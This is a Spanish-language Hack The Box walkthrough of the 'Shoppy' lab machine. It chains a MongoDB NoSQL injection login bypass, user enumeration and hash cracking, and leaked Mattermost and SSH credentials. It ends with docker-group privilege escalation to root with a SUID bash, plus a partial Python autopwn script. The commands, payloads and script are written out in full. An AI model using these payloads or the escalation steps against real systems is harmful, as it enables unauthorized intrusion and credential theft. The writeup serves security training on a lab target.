---
title: Hackthebox Writeup Shoppy
date: 2022-10-04 11:58:15 am
categories: [HTB, Writeups]
tags: [HTB, Linux, Easy, NoSQLI, Information Leakage, Reverse Engineering, Docker]

img_path: /assets/img/htb/writeups/shoppy
---

# Overview

1. Bypass login page by **NoSQL Injection**
2. User credentials by **User enumeration**
3. Leak of SSH credentials in **Mattermost** system (Foothold)
4. SSH credentials leak by **Reverse engineering** to binary
5. Host-to-container filesystem mount **by non-privileged user docker group** (Privilege Escalation)

* * *

![Logo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.180 |  17 Sep 2022 |    Easy    |   20   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.180
PING 10.10.11.180 (10.10.11.180) 56(84) bytes of data.
64 bytes from 10.10.11.180: icmp_seq=1 ttl=63 time=106 ms
                                          \______________________ Linux Machine
--- 10.10.11.180 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 103.824/103.824/103.824/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Empezamos con la fase de reconocimiento haciendo un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir los puertos abiertos de la máquina:

```console
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 12:06 -05
Nmap scan report for 10.10.11.180
Host is up (0.11s latency).
Not shown: 65389 closed tcp ports (reset), 143 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
                \_________________ Secure Shell Protocol
80/tcp   open  http
                \_________________ Hypertext Transfer Protocol
9093/tcp open  copycat
                \_________________ Copycat database replication service
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> --open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora realizamos un escaneo mas profundo para encontrar que servicios corren por cada uno de los puertos descubiertos **22(SSH) - 80(HTTP) - 9093(copycat)**:

```console
❯ nmap -p22,80,9093 -sCV -oN openPortsTCP 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 13:09 -05
Nmap scan report for 10.10.11.180
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 04 Oct 2022 18:03:39 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 27
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 27
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.9011e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.1685e-05
|     go_gc_d
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 04 Oct 2022 18:03:40 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 27
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 27
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.9011e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.1685e-05
|_    go_gc_d
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=10/4%Time=633C757A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2A5A,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Tue,\x2
SF:004\x20Oct\x202022\x2018:03:39\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
SF:total\x2027\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicatio
SF:n\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_gc
SF:_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_gc
SF:_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\x
SF:20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_t
SF:otal_gc_cycles_total\x2027\n#\x20HELP\x20go_gc_duration_seconds\x20A\x2
SF:0summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collecti
SF:on\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_d
SF:uration_seconds{quantile=\"0\"}\x203\.9011e-05\ngo_gc_duration_seconds{
SF:quantile=\"0\.25\"}\x207\.1685e-05\ngo_gc_d")%r(HTTPOptions,2F0E,"HTTP/
SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\x
SF:20charset=utf-8\r\nDate:\x20Tue,\x2004\x20Oct\x202022\x2018:03:40\x20GM
SF:T\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
SF:ntime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counter
SF:\ngo_gc_cycles_automatic_gc_cycles_total\x2027\n#\x20HELP\x20go_gc_cycl
SF:es_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_force
SF:d_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\
SF:n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all\
SF:x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cycl
SF:es_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2027\n#\x20HEL
SF:P\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20du
SF:ration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_d
SF:uration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x203
SF:\.9011e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x207\.1685e-05\n
SF:go_gc_d");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear
>
> -sCV (Fusión de parámetros -sC -sV)
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
>
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

> Existe un **falso positivo** en el puerto **9093** por parte de `nmap` al momento del reconocimiento del mismo
{: .prompt-warning}

```text
9093/tcp open  copycat?
...
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
```

Ya que no disponemos de credenciales omitimos analizar el puerto **22(SSH)** y empezamos con el reconocimiento del puerto **80(HTTP)**. Para ello iniciamos escaneando que tecnologías usa el servicio web:

> Usando `whatweb`

```console
❯ whatweb 10.10.11.180
http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
ERROR Opening: http://shoppy.htb - no address for shoppy.htb <-- Here
```

> Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión [Wappalyzer](https://www.wappalyzer.com/apps/)
{: .prompt-info}

Lo que hacen estas herramientas es realizar diferentes tipos de solicitudes a la web y a traves de la respuesta, ya sea en los headers o código fuente, almacenan las diferentes versiones de las tecnologías que se usa, por ejemplo:

> Usando `nc`

```console
❯ nc 10.10.11.180 80
GET / HTTP/1.0

HTTP/1.1 301 Moved Permanently      
Server: nginx/1.23.1
Date: Tue, 04 Oct 2022 18:22:42 GMT
Content-Type: text/html
Content-Length: 169
Connection: close
Location: http://shoppy.htb <-- Here (ask a web browser to load a different web page)

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.23.1</center>
</body>
</html>
```

En ambos casos, llama nuestra atención la redirección hacia el dominio `shoppy.htb` al momento de la solicitud al servicio web

Entonces sabemos que se aplica **Virtual hosting** del tipo **Domain name**, lo cúal permite que una dirección **IP** funcione para varias paǵinas web. Para ello, debemos agregar el dominio `shoppy.htb` a nuestro archivo _/etc/hosts_ que se encargará de la resolución de direcciones IP y nombres de dominio

```bash
echo "10.10.11.180 shoppy.htb" >> /etc/hosts
```

Al entrar a `http://10.10.11.180` observaremos que habrá una redirección a `http://shoppy.htb`

> Usando `Chromium`

![shoppy.htb-web](shoppy_htb_web.png){: .shadow}

Como no tenemos una interfaz con funcionalidad procedemos a enumerar que directorios existen en la web, para empezar usamos el script `http-enum` de `nmap`

```console
❯ nmap -p80 --script http-enum shoppy.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 14:13 -05
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /login/: Login page
```

Únicamente encontramos la ruta `/login` con la siguiente interfaz:

![shoppy.htb-login-web](shoppy_htb_login_web.png){: .shadow}

## Foothold

* * *

Es importante saber que al estar **frente a una página de logeo podemos aplicar diversar técnicas para evadirlas**, ya sea revisando el código fuente hasta o probar distintas inyecciones de autenticación. En está ocasión primero testeamos si podemos enumerar usuarios debido a la respuesta (el clásico _El usuario x no existe_ ó _Contraseña incorrecta para el usuario x, etc_). Sin embargo conseguimos la misma respuesta para cualquiera de las alternativas **Wrong Credentials** (manera efectiva de evitar este tipo de ataques de enumeración)

En el transcurso de probar diversos payloads y cambiando la cabezera `Content-Type` para la inyección que veremos luego pude generar un error y se filtro información importante que nos permitió enumerar un usario del sistema `jaeger` por la ruta _/home_

![shoppy.htb-error-user-enumeration](shoppy_htb_login_error_user_enumeration.png){: .shadow}

Lo que si obtuvo un comportamiento raro fue al intentar una **Inyección SQL**, ya que al ejecutar el clásico input de comilla simple `'` para verificar una posible respuesta con errores e información respecto a la **base de datos existente** que corre por detrás, la página se queda cargando y después de un minuto obtenemos un **504 Gateway Time-out**

De primeras este comportamiento es sospechoso, y al no darnos resultados pasamos a intentar **Inyecciones NoSQL** de las bases de datos NoSQL mas usadas, como por ejemplo `MongoDB`

![monog-SQLi](mongo_sqli.png){: .shadow}

```console
❯ mongo_inyection="' || 1==1%00"; curl -si -X POST -d "username=$mongo_inyection&password=" http://shoppy.htb/login
HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Tue, 04 Oct 2022 22:33:04 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 28
Connection: keep-alive
Location: /admin
Vary: Accept
Set-Cookie: connect.sid=s%3Allicfo6nBCXrJUxRWtE1kDVYDFb_--rg.HNyc0WXYDLCGhx4xb%2F620KnAtbOwyJod13xbblHrbbw; Path=/; HttpOnly

Found. Redirecting to /admin
```

Lo que hacemos aqui es pasarle un nombre de usuario vacío seguido del operador lógico **OR (\|\|)** y una declaración verdadera **1==1**, lo cuál permitira validar la consulta a pesar de pasar un usuario que no existe. Y por último un **Null byte (%00)** que tiene como rol único terminar el string para poder ignorar validaciones posteriores (en este caso ignorar la valiación del campo password)

> Aquí puedes encontrar mas información sobre maneras de evadir páginas de logeo [https://book.hacktricks.xyz/pentesting-web/login-bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass)
{: .prompt-info}

> El problema que existe al logearnos ingresando la inyección es que la web codifica la data a **URL**, por ello recomiendo pasarlo por burpsuite para decodificarlo y enviarlo
{: .prompt-warning}

> Sin embargo, en la web también puedes pasar una inyección con un usuario válido (el clásico admin por defecto) y agregando una comilla para cerrar el campo username original `admin' || '`
{: .prompt-tip}

Logramos entrar a la web y observamos lo siguiente:

![shoppy-htb-admin-web](shoppy_htb_admin_web.png){: .shadow}

Llama la atención que podemos buscar usuarios, y probando usuarios clásicos conseguimos dar respuesta al buscar con el usuario `admin`

![shoppy-htb-admin-web-search](shoppy_htb_admin_search_admin.png){: .shadow}

Al descargar la exportación nos muestra las credenciales del usuario `admin` en formato `json`

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  }
]
```

Sin embargo no conseguimos crackearla, pero a pesar de eso tenemos una vía de **enumerar más usuarios**. Por ello usamos `wfuzz` y con un diccionario de nombres filtramos por las respuestas que contengan **Download export**

```console
❯ wfuzz -c -w /usr/share/SecLists/Usernames/Names/names.txt --ss 'Download export' -b 'connect.sid=s%3A-KBUXDEBlgxYGHsr_sTcAWrfSW17csU1.gTfrPHTEMAjVmXuy6kmZYUYSf5zd%2Bfi7agmkHzZPor4' http://shoppy.htb/admin/search-users?username=FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/admin/search-users?username=FUZZ
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000086:   200        55 L     160 W      2720 Ch     "admin"                                                                                                    
000004909:   200        55 L     160 W      2720 Ch     "josh" <-- New user!
```

Obtenemos otro archivo en formato `json` con credenciales del usuario `josh` (hash md5 por el formato), así que la crackeamos con una web muy conocida [https://crackstation.net/](https://crackstation.net/)

![josh-password-hash](josh_password_hash_crackstation.png){: .shadow}

Ahora tenemos las credenciales `josh:remembermethisway`, podemos intentar por **SSH** pero no conseguimos ingresar, solo son las credenciales para logearnos en donde ya estamos

Continuando con la enumeración ingresamos al puerto **9093** que nos sabemos a ciencia exacta que es

![shoppy.htb-port-9093](shoppy_htb_port_9093.png){: .shadow}

Observamos lo que parece ser **logs** que si actualizamos veremos que va cambiando. Además, de primera vista leemos `Go runtime` y `GC cycles` que se repite a menudo  y la siguiente información que puede ser de ayuda

```text
# HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
...
# HELP go_info Information about the Go environment.
# TYPE go_info gauge
go_info{version="go1.18.1"} 1
...
playbooks_plugin_system_playbook_instance_info{Version="1.29.1"} 1
```

Investigando encontramos la relación del lenguaje `Go` con `GC` (Gargabe Collector), el cuál es un sistema que ayuda a gestionar la memoria de una aplicación identificado partes de la memoria que ya no son necesarias. Y por último, muestran el termino `playbooks_plugin_system` y su version respectiva

Entonces relacionando los términos `Go enviroment` y `playbooks plugin` encontramos el siguiente repositorio:

![mattermost-playbook-repository](mattermost_playbooks_repository.png){: .shadow}

Buscando sobre **Mattermost** encontramos que es una plataforma de mensajería instantánea segura y colaborativa para organizaciones y compañias. Además, tiene una aplicación web y probablemente lo que vemos en el puerto `9093` tiene relación con la misma

Pero pensando un poco más podemos deducir que probableme tengamos acceso para la aplicación. Para ello podemos recordar el concepto de `subdominios` que nos sirve para organizar diversas secciones de nuestra web (shoppy.htb) y funcionen de manera independiente. Así que probando el subdominio `mattermost.shoppy.htb` y aplicando el concepto del principio de **Virtual Hosting** obtenemos la siguiente paǵina:

![mattermost-shoppy.htb-login](mattermost_shoppy_htb_login.png){: .shadow}

> Si no llegamos a la conclusión anterior tambien podemos **Fuzzear** en algunos diccionarios
{: .prompt-info}

```bash
❯ for i in /usr/share/SecLists/Discovery/DNS/*; do echo "$i\n"; grep -n -e '^mattermost$' $i; done
/usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt

47340:mattermost
/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top500.txt

/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt

/usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt

923243:mattermost
/usr/share/SecLists/Discovery/DNS/fierce-hostlist.txt

/usr/share/SecLists/Discovery/DNS/italian-subdomains.txt

/usr/share/SecLists/Discovery/DNS/namelist.txt

82865:mattermost
/usr/share/SecLists/Discovery/DNS/shubs-stackoverflow.txt

/usr/share/SecLists/Discovery/DNS/shubs-subdomains.txt

/usr/share/SecLists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt

```

Observamos un panel de logeo e intentamos usar las credenciales que conseguimos anteriormente `josh:remembermethisway`, nos logeamos y entramos a la aplicación **Mattermost**:

![mattermost-shoppy.htb-mattermost](mattermost_shoppy_htb_mattermost_App.png){: .shadow}

Empezando rápidamente a revisar las funcionalidades de la página encontramos en la sección de menciones un mensaje justamente del usuario que enumeramos al principio `jaeger` con lo siguiente:

![mattermost_shoppt_htb_leakage_information](mattermost_shoppy_htb_leakage.png){: .shadow}

Debido a **filtración de información** obtenemos las credenciales `jaeger:Sh0ppyBest@pp!`, y como sabemos que el usuario es parte del sistema las usamos para entrar por **SSH** y conseguir la flag:

```console
❯ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@10.10.11.180
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  4 22:17:12 2022 from 10.10.14.99
jaeger@shoppy:~$ find / -name user.txt -exec ls -l {} + 2>/dev/null
-rw-r----- 1 root jaeger 33 Oct  4 21:53 /home/jaeger/user.txt
```

Ya que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores:

> NoSQL Injection (file:/home/jaeger/ShoppyApp/index.js:)

Observamos en la linea `10` que tanto el usuario como la contraseña de insertan dentro de la `query` sin aplicar algún filtro:

```javascript
...
app.post('/login', async (req, res) => {                                                                                                                      
    const username = req.body.username;                                        
    const password = req.body.password;                          
    if (username === undefined || password === undefined) {                                                                                                   
        res.status(400).send('Bad Request');
        return;                                                                                                                                               
    }                                                                                                                                                         
    const passToTest = require('crypto').createHash('md5').update(password).digest('hex');
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
    const result = await User.find(query).maxTimeMS(350);                      
    if (result.length === 0) {                                                 
        res.redirect('/login?error=WrongCredentials');                         
    } else {                         
        req.session.username = req.body.username;                                                                                                             
        req.session.save((error) => {                                                                                                                         
            if (error) {                                                       
                res.redirect('/login?error=WrongCredentials');
            } else {                                                           
                res.redirect('/admin'); 
            }                                                                  
        });                                                                    
    }                                                                                                                                                   })
...
```

> Aquí tienes un claro ejemplo de **Inyección NoSQL con Mongo** [https://nullsweep.com/a-nosql-injection-primer-with-mongo/](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
{: .prompt-info}

> Revisando los canales de la web **Mattermost** podemos encontrar comentarios que dan una pista para la **Escalada de privilegios**
{: .prompt-tip}

## Privilege Escalation

* * *

Después de una enumeración básica del sistema encontramos que tenemos los permisos como usuario `deploy` para ejecutar el comando `/home/deploy/password-manager`

```console
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Al ejecutarlo nos pide la **master password**:

```console
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: idontknowpassword            
Access denied! This incident will be reported !
```

Ya que tenemos permisos para descargarlo lo traemos a nuestra máquina para analizarlo y aplicar **Ingeniería Inversa** con `ghidra`:

![password-manager-ghidra](password_manager_ghidra.png){: .shadow}

Observamos que nuestro input se guarda en la variable `local_48` y luego se inserta en la variable `local_68` la palabra **Sample** que luego se compara con nuestro input y si son iguales devolverá el número '0' y nos mostrará el archivo _/home/deploy/creds.txt_. Entonces ingresamos esa palabra y conseguimos las credenciales del usuario `deploy`:

```console
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Como el usuario `deploy` observamos que pertenecemos al grupo `docker`, lo cuál de alguna manera nos permite obtener privilegios ya que sabemos que `docker` **requiere permisos de root** para su ejecución

```console
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
deploy@shoppy:~$ find / -group docker 2>/dev/null | xargs ls -l
srw-rw---- 1 root docker 0 Oct  5 00:01 /run/docker.sock
```

Usamos `docker ps` para ver las imágenes que tenemos disponibles y crear un contenedor observamos que nos encontramos como usuario `root`:

```console
deploy@shoppy:~$ docker run -it alpine
/ # whoami
root
/ # ls -a
.           .dockerenv  dev         home        media       opt         root        sbin        sys         usr
..          bin         etc         lib         mnt         proc        run         srv         tmp         var
```

Revisando la IP y viendo el archivo _.dockerenv_ sabemos que nos es la máquina original. Pero con solo saber que estamos dentro como `root` ya podemos escalar privilegios en la máquina principal

Entonces lo que podemos hacer es crear un contenedor con la imagen que tenemos, montar todo el sistema de archivos de la **máquina host (10.10.11.180)** a nuestro **contenedor (172.17.0.2)** y ya que somos `root` podremos usar todos esos archivos y binarios como si estuvieramos en la misma máquina host:

```console
deploy@shoppy:~$ docker run -it -v /:/tmp --rm alpine chroot /tmp bash
root@15d0b34856d2:/# whoami
root
root@15d0b34856d2:/# ls -a
.   .cache  boot  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
..  bin     dev   home  initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz
```

Para un accesso persistente podríamos asignarle permisos **SUID** al binario `/bin/bash` para poder ejecutarlo como el propietario y conseguir la flag:

```console
deploy@shoppy:~$ docker run -it -v /:/tmp --rm alpine chroot /tmp bash
root@f5a544f92c52:/# chmod u+s /bin/bash
root@f5a544f92c52:/# exit
exit
deploy@shoppy:~$ bash -p
bash-5.1# whoami
root
bash-5.1# find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Oct  5 00:01 /root/root.txt
```

> Ya saben, no asignemos el grupo `docker` a cualquier usuario ya que existen varias maneras de escalar privilegios
{: .prompt-warning}

> Para un análisis mas a fondo y todo tipo de cosas que puedas hacer respecto al **UNIX socket (docker.sock)** recomiendo este articulo [https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
{: .prompt-info}

Para finalizar y como es costumbre hice un **autopwn** en `python` aplicando todos los conceptos vistos:

```python
import argparse
import hashlib
import json
import paramiko		 # pip install paramiko
import requests 	 # pip install requests
import shlex		 
import signal
import subprocess
import sys
import time

from pwn import * 	 # pip install pwntools

""" 
Autopwn Shoppy HTB Machine
--------------------------
Author: Marss
Date: Sep 30, 2022 
"""

# Variables
target_host = '10.10.11.180'
wordlist_filename = 'rockyou.txt'

# ctrl + c
def signal_handler(signum, frame): sys.exit('\n[!] User terminated.')

signal.signal(signal.SIGINT, signal_handler)

# make get/post request
def make_request(session, method, target_url, headers=None, cookies=None, json_data=None):
	response = ''
	try:
		if method == 'get':
			response = session.get(target_url, headers=headers, cookies=cookies)
		elif method == 'post':
			response = session.post(target_url, headers=headers, json=json_data)
	except Exception as error:
		print('[x] Error: %s' % error)
	return response

# read wordlist file
def get_wordlist():
	with open(wordlist_filename, 'r', errors='replace') as file: # errors='replace' (UnicodeDecodeError)
		wordlist = file.readlines()
	return wordlist

# convert password to hash (md5)
def to_hash(password):
	password_hash = hashlib.md5(password.encode())
	return password_hash.hexdigest()

# crack password hash
def cracking_password(password_hash, wordlist=get_wordlist()):
	for word in wordlist:
		word = word.strip('\n')
		if to_hash(word) == password_hash:
			return word

# connect via ssh and run commands
def ssh_exec_commands_like(ssh_username, ssh_password, commands):
	_stdout_commands = []
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(target_host, port=22, username=ssh_username, password=ssh_password)

		for command in commands:
			_stdout = ''
			if 'sudo' in command:
				_stdin, _stdout, _stderr = client.exec_command(command, get_pty=True)
				_stdin.write(ssh_password + '\n')
				_stdin.flush()
			else:
				_stdin, _stdout, _stderr = client.exec_command(command, get_pty=True)
			_stdout_commands.append(_stdout.read().decode())
		
		client.close()
	except Exception as error:
		print('[x] Error: %s' % error)
	
	return _stdout_commands

# bypass login to shoppy.htb (Mongo NoSQLi) and return Josh password hash
def get_josh_password_hash():
	josh_password_hash = ''

	try:
		session = requests.Session()
		
		log.info('Bypass login')

		headers = {'Content-Type':'application/json'}
		post_data = {
			"username" : "admin'||' 1==1",
			"password" : ""
		}

		_ = make_request(session=session, method='post', target_url='http://shoppy.htb/login', headers=headers, json_data=post_data)
		cookies = session.cookies.get_dict()
		
		log.info('Extract password')

		_ = make_request(session=session, method='get', target_url='http://shoppy.htb/admin/search-users?username=josh', cookies=cookies)
		response = make_request(session=session, method='get', target_url='http://shoppy.htb/exports/export-search.json', cookies=cookies)
		josh_password_hash = json.loads(response.text)[0]['password']
				
		session.close()
	except Exception as error:
		print('[x] Error: %s' % error)

	return josh_password_hash

# login mattermost.shoppy.htb (Josh credentials) and return credentials from user Jaeger
def get_jaeger_credentials(josh_password_text):
	deploy_machine_username = ''
	deploy_machine_password = ''

	try:
		session = requests.Session()
		
		log.info('Persistent login to mattermost API')

		headers = {"Content-Type" : "application/json"}
		post_data = {
			"login_id" : "josh",
			"password" : "{}".format(josh_password_text)
		}

		response = make_request(session=session, method='post', target_url='http://mattermost.shoppy.htb/api/v4/users/login', headers=headers, json_data=post_data)
		user_mfa_token = response.headers['Token']
		user_id = json.loads(response.text)['id']

		headers = {"Authorization" : "Bearer {}".format(user_mfa_token)}

		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/users/{user_id}/teams', headers=headers)
		user_teams_id = json.loads(response.text)[0]['id']

		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/teams/{user_teams_id}/channels/name/deploy-machine', headers=headers)
		deploy_machine_channel_id = json.loads(response.text)['id']
		
		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/channels/{deploy_machine_channel_id}/posts', headers=headers)
